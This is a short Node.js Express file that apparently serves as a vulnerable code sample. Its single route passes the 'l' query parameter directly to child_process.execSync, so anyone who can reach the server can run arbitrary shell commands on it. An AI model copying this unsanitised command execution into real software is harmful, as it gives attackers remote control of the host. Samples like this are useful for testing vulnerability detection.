const express = require('express');
const cp = require('child_process');
const runArrow = (cmd) => cp.execSync(cmd);
const app = express();
app.get('/l', (req, res) => { runArrow(req.query.l); res.end(); });
